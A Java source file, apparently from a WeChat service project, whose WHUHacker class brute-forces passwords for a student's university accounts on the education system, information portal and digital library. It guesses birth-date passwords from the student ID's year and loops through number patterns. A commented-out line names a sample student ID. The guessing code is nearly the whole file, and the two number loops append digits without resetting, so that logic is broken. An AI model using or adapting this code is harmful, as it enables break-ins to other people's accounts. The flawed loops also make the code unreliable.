package com.wdyx.weixin.hacker;

import java.text.SimpleDateFormat;
import java.util.Calendar;
import com.wdyx.weixin.service.DigitalLibraryService;
import com.wdyx.weixin.service.EduInfoService;
import com.wdyx.weixin.service.InfoPortalService;

/**
 * 放心吧，我不会黑你的
 * @author 帮杰
 *
 */
public class WHUHacker {

	private String username;
	public WHUHacker(String username){
		this.username = username;
	}
	public String hackEIS(){
		int year = Integer.parseInt(username.substring(0, 4))-20;
		Calendar calendar1 = Calendar.getInstance();
		Calendar calendar2 = Calendar.getInstance();
		calendar1.set(year, 0, 1);
		calendar2.set(year+3, 11, 31);
		SimpleDateFormat format = new SimpleDateFormat("yyyyMMdd");
		String psw = "";
		while(calendar1.before(calendar2)){
			psw = format.format(calendar1.getTime());
			if(new EduInfoService(username,psw).login()){
				break;
			}
			calendar1.add(Calendar.DATE, 1);
		}
		return psw;
	}
	public String hackIPS(){
		String psw = "";
		for(int i=1;i<31;i++){
			psw = ""+i;
			if(i<10){
				psw = "0"+psw;
			}
			for(int j=0;j<9999;j++){
				String s = ""+j;
				while(s.length()<4){
					s = "0"+s;
				}
				psw += s;
				if(new InfoPortalService(username,psw).login()){
					return psw;
				}
			}
		}
		return psw;
	}
	public String hackDLS(){
		String psw = "";
		for(int i=1;i<31;i++){
			psw = ""+i;
			if(i<10){
				psw = "0"+psw;
			}
			for(int j=0;j<9999;j++){
				String s = ""+j;
				while(s.length()<4){
					s = "0"+s;
				}
				psw += s;
				if(new DigitalLibraryService(username,psw).login()){
					return psw;
				}
			}
		}
		return psw;
	}

	public static void main(String[] args){
		//String username = "2013301200213";
		//WHUHacker whuHacker = new WHUHacker(username);
		//System.out.println(whuHacker.hackEIS());
		//System.out.println(whuHacker.hackIPS());
		//System.out.println(whuHacker.hackDLS());
	}
}
